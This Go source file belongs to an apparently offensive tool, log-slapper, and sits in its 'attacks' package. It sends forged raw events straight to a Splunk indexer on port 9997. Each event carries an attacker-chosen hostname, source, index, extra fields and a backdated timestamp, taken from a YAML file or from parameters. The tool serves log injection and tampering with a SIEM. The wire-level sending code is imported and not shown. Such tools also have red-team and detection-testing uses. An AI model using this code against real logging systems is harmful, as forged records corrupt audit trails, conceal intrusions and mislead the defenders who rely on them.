package attacks

import (
	"fmt"
	"log"
	"time"

	"github.com/oz9un/log-slapper/pkg/splunk"
	"github.com/pterm/pterm"
)

const RawTimeFormat = "02/01/2006 15:04:05"

func RawEventSenderFile(configFilePath string) {
	// Process the YAML configuration file to get config data
	config, err := splunk.ProcessConfigFile(configFilePath)
	if err != nil {
		log.Fatalf("Error processing config file: %v", err)
	}

	// Common settings that apply to all events
	targetIndexer := fmt.Sprintf("%s:%s", config.Splunk.TargetIP, config.Splunk.TargetPort)
	fields := make(map[string]string)
	for key, value := range config.ExtraFields {
		fields[key] = value
	}
	hostname := config.Log.Hostname
	source := config.Log.Source
	sourcetype := config.Log.Sourcetype
	indexName := config.Log.Index

	// Iterate through each event in the config
	for _, event := range config.Events {
		epochtime := parseTimeToEpoch(event.Time)
		eventString := event.Data

		helloData := splunk.PrepareHelloData(hostname)
		eventData := splunk.PrepareEventData(fields, source, hostname, sourcetype, indexName, eventString, epochtime)

		if err := splunk.SendRawData(helloData, eventData, targetIndexer); err != nil {
			pterm.Error.Println("Error sending event data to Splunk: %v\n", err)
		} else {
			pterm.Success.Println("Event data sent successfully to Splunk.")
		}
	}
}

// Modified function to accept parameters directly
func RawEventSender(targetIP string, indexName, source, sourcetype, hostname string, epochtime int64, eventString string, extraFields map[string]string) {
	// Prepare the hello and event data using the provided parameters
	helloData := splunk.PrepareHelloData(hostname)
	eventData := splunk.PrepareEventData(extraFields, source, hostname, sourcetype, indexName, eventString, epochtime)

	targetPort := "9997"
	targetIndexer := fmt.Sprintf("%s:%s", targetIP, targetPort)

	// Send the prepared data to Splunk
	if err := splunk.SendRawData(helloData, eventData, targetIndexer); err != nil {
		log.Printf("Error sending data to Splunk: %v\n", err)
	} else {
		pterm.Success.Println("Data sent successfully to Splunk.")
		fmt.Println()
	}
}

func parseTimeToEpoch(timeStr string) int64 {
	commandTime, err := time.Parse(RawTimeFormat, timeStr)
	if err != nil {
		pterm.Error.Println("Invalid start time format: %v\n", err)

		return 0
	}

	return commandTime.Unix()
}
